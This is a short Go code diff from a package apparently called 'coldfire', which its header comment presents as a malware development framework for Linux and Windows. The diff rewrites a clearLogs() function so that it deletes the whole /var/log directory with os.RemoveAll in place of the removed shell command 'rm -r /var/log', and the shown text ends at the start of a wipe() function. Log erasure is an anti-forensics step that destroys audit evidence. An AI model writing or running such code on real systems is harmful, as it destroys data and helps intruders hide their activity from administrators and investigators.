@@ -2,15 +2,11 @@
 // for malware development that are mostly compatible with
 // Linux and Windows operating systems.
 package coldfire
-
+import "os"
 
 func clearLogs() error {
-	_, err := cmdOut("rm -r /var/log")
-	if err != nil {
-		return err
-	}
-
-	return nil
+	err := os.RemoveAll("/var/log")
+	return err
 }
 
 func wipe() error {
